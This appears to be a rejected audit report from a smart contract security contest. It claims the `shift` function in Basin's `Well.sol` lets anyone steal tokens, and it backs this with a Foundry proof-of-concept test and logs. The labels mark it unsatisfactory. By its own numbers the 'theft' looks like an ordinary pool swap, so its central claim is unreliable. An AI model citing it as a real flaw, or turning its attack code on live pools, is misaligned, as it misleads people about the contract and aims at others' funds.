# #128: Function `shift` in `Well.sol` can be used by anyone to steal valuable ERC20's 
Labels: ['bug', '3 (High Risk)', 'unsatisfactory', 'duplicate-25']
Accepted: False

# Lines of code

https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L352-L377


# Vulnerability details

## Impact
The function `shift` can be used by anyone to take out an excess amount of an ERC20 that it is in the contract by checking the reserves and the `balanceOf` the contract. Firstly the function creates a memory variable of `reserves` and updates every value in the array with the `balanceOf(address(this))` https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L363-L364 and then calls the `_calcReserve` and calculates the difference between the updated reserve and the result from `calcReserve` in the `ConstantProduct2.sol`. The problem relies in the fact that anyone can transfer some tokens to any `Well` and call this function to get the other more valuable token.
## Proof of Concept
Let's take this simple example of a `Well` created with two known and used ERC20, DAI token and WETH token.
- Someone creates a `Well` with these 2 ERC20 and provides liquidity to the contract. In total the full liquidity provided consist into 1000 DAI tokens and 4 WETH.
- An attacker sees the `Well` and wants to profit from this specific `Well` so he `transfer` 100 DAI tokens, which are worth ~ \$100 to the contract and then calls the `shift` function
```solidity
 function test_shift_stealTokens() public prank(user) {

        // Amounts of tokens before transfering or shifting
        console.log("Amounts of DAI before the transfer:%s",tokens[0].balanceOf(address(well)));
        console.log("Amounts of WETH before the transfer:%s",tokens[1].balanceOf(address(well)));

        //Amount of WETH able to be shifted out of the contract 
        console.log("Amount of shift out WETH before transfering tokens to the contract:%s",well.getShiftOut(tokens[1]));
        
        console.log("Attacker transfers 100 DAI to the contract to call shift to get WETH");
        tokens[0].transfer(address(well),100e18);
        
        //Amount of tokens after the transfer before shifting
        console.log("Amounts of DAI after the transfer:%s",tokens[0].balanceOf(address(well)));
        console.log("Amounts of WETH after the transfer:%s",tokens[1].balanceOf(address(well)));
        
        //Amount of WETH able to be shifted out of the contract after the transfer
        console.log("Amount of WETH the attacker would get:%s",well.getShiftOut(tokens[1]));
        well.shift(tokens[1],0,user);

        // Amounts of tokens after transfering or shifting
        console.log("Amounts of DAI after the shift was called:%s",tokens[0].balanceOf(address(well)));
        console.log("Amounts of WETH after the shift was called:%s",tokens[1].balanceOf(address(well)));

    }
```
Here is the logs for this POC
```
Amounts of DAI before the transfer:1000000000000000000000
  Amounts of WETH before the transfer:4000000000000000000
  Amount of shift out WETH before transfering tokens to the contract:0
  Attacker transfers 100 DAI to the contract to call shift to get WETH
  Amounts of DAI after the transfer:1100000000000000000000
  Amounts of WETH after the transfer:4000000000000000000
  Amount of WETH the attacker would get:363636363636363636
  Amounts of DAI after the shift was called:1100000000000000000000
  Amounts of WETH after the shift was called:3636363636363636364
```

As you can see from this simple POC the attacker provided 100 DAI tokens, which are worth roughly ~\$100 and got 0.36 WETH which is around ~\$670 as of the moment of writing this report. This can happen to any `Well` that has 2 tokens which values differ a lot, since the function doesn't use any Oracle to see the values of the tokens and uses just the `balanceOf`, `shift` can be abused easily making profits for attackers in most cases.

## Tools Used
Manual review, Foundry testing
## Recommended Mitigation Steps
I would recommend to take out the function since you already have and use the `skim` function similar to Uniswap or change it in a way so that it is not so easily abusable by an attacker.


## Assessed type

Token-Transfer